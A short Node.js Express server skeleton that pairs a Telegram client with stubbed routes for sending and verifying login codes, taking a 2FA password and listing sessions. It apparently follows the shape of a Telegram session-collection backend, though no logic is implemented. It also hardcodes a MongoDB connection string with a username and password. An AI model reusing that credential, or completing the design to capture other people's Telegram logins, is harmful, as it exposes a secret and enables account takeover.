const express = require('express');
const cors = require('cors');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const input = require('input'); // Kannst du ggf. entfernen, falls nicht genutzt
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(express.json());

// MongoDB Verbindung
const MONGO_URI = "mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?appName=Cluster0";
mongoose.connect(MONGO_URI);

// Hier definieren wir die Routen, NACHDEM app initialisiert wurde
app.post('/send-otp', async (req, res) => {
    const { phone } = req.body;
    // Logik für sendCode hier...
    res.json({ message: "OTP sent" });
});

app.post('/verify-otp', async (req, res) => {
    const { phone, code, phoneCodeHash, password } = req.body;
    // Logik für signIn hier...
    res.json({ success: true });
});

app.get('/get-sessions', async (req, res) => {
    // Session Liste holen
    res.json([]);
});

// Server starten
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
